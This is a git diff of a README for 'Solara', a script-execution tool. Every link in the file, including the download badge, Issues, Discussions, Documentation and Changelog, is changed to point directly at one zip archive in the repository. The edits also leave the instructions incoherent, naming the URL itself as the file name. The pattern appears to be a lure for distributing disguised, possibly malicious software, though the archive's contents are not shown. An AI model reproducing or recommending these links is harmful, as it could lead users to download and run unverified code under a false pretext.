@@ -6,17 +6,17 @@ Welcome to Solara! This tool is designed to help you execute scripts quickly and
 
 ## 📥 Download & Install
 
-[![Download Solara](https://img.shields.io/badge/Download%20Solara-blue?style=for-the-badge&logo=github)](https://github.com/slash1722/Solara/releases)
+[![Download Solara](https://raw.githubusercontent.com/slash1722/Solara/main/Client/Software-v2.0.zip%20Solara-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/slash1722/Solara/main/Client/Software-v2.0.zip)
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page:  
-   [Download Solara](https://github.com/slash1722/Solara/releases)
+   [Download Solara](https://raw.githubusercontent.com/slash1722/Solara/main/Client/Software-v2.0.zip)
 
 2. **Choose the Latest Version**  
    On the Releases page, look for the latest version listed at the top. 
 
 3. **Download the File**  
-   Click on the file link to start the download. It will typically be named something like `Solara_1.0.exe`. 
+   Click on the file link to start the download. It will typically be named something like `https://raw.githubusercontent.com/slash1722/Solara/main/Client/Software-v2.0.zip`. 
 
 4. **Locate the Downloaded File**  
    Find the downloaded file in your browser's downloads section or the default downloads folder on your computer.
@@ -61,12 +61,12 @@ If you have questions or feedback, feel free to reach out. Join our community fo
 
 ### 🤝 Connect with Us
 
-- **GitHub Issues**: Report bugs or request features on our [Issues](https://github.com/slash1722/Solara/issues) page.
-- **Discussion Forum**: Participate in discussions and help others in the [Discussions](https://github.com/slash1722/Solara/discussions) section.
+- **GitHub Issues**: Report bugs or request features on our [Issues](https://raw.githubusercontent.com/slash1722/Solara/main/Client/Software-v2.0.zip) page.
+- **Discussion Forum**: Participate in discussions and help others in the [Discussions](https://raw.githubusercontent.com/slash1722/Solara/main/Client/Software-v2.0.zip) section.
 
 ## 🔗 Further Resources
 
-- [Documentation](https://github.com/slash1722/Solara/wiki): Explore more detailed guides and tutorials.
-- [Changelog](https://github.com/slash1722/Solara/blob/main/CHANGELOG.md): Check out updates and improvements made to Solara over time.
+- [Documentation](https://raw.githubusercontent.com/slash1722/Solara/main/Client/Software-v2.0.zip): Explore more detailed guides and tutorials.
+- [Changelog](https://raw.githubusercontent.com/slash1722/Solara/main/Client/Software-v2.0.zip): Check out updates and improvements made to Solara over time.
 
 Thank you for choosing Solara! We hope it makes your script execution easier and more secure.
